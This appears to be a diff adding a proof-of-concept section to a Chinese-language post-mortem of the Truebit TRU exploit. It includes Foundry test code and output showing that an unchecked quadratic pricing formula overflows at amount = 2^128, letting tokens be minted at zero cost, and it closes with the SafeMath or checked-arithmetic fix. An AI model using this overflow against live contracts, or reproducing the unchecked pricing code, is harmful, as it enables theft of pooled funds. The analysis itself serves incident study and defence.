@@ -116,6 +116,38 @@ amount = 240,442,509,453,545,333,947,284,131
 
 ---
 
+## 8 · PoC(可运行复现)
+
+我们写了一个**可编译、可运行**的 Foundry PoC,用 `unchecked {}` 精确还原 Solidity 0.6.10 的"无溢出检查"语义,复现"溢出 → 价格塌零 → 免费铸币"。完整代码:仓库 `PoC/test/TruebitOverflow.t.sol`。
+
+核心(脆弱定价 + 攻击):
+```solidity
+// 文档化的分子二次项:100 * amount^2 * reserve(就是它溢出);0.6.10 不检查溢出
+function getPurchasePrice(uint256 amount) public view returns (uint256 price) {
+    unchecked {
+        uint256 numerator = 100 * amount * amount * reserve;
+        price = numerator / DENOM;
+    }
+}
+// amount = 2^128  =>  amount^2 = 2^256 ≡ 0 (mod 2^256)  =>  分子回绕为 0  =>  价格 = 0
+function test_overflow_makes_mint_free() external view {
+    uint256 crafted = 2 ** 128;
+    require(pool.getPurchasePrice(crafted) == 0, "overflow did not zero the price");
+    require(pool.getPurchasePrice(1e18) > pool.getPurchasePrice(crafted), "monotonicity broken");
+}
+```
+
+运行结果(`forge test -vv`):
+```
+[PASS] test_honest_buy_costs_eth()       诚实买入(1 TRU)需付费,价格 > 0
+[PASS] test_overflow_makes_mint_free()   构造 amount=2^128 后价格塌到 0 = 免费铸币
+Suite result: ok. 2 passed; 0 failed
+```
+
+**结论**:`amount = 2^128` 时 `amount^2 = 2^256 ≡ 0`,二次项分子回绕为 0,购买价被截断到 0 —— 买 1 个 TRU 要钱、买 2¹²⁸ 个 TRU 却 0 成本,**定价单调性被溢出打破**。这正是攻击者"几乎 0 成本铸出海量 TRU、再卖回储备抽走 ETH"的弹药来源。**防御侧**:0.8 内置 checked 算术 / 0.6.x 全程 SafeMath,即可让该笔铸造在溢出点直接 revert。
+
+---
+
 ## 来源
 
 - CoinDesk:《Truebit token (TRU) crashes 99.9% after hacker drains $26.6 million in ether》 https://www.coindesk.com/markets/2026/01/09/truebit-token-tru-crashes-99-9-after-usd26-6m-exploit-drains-8-535-eth
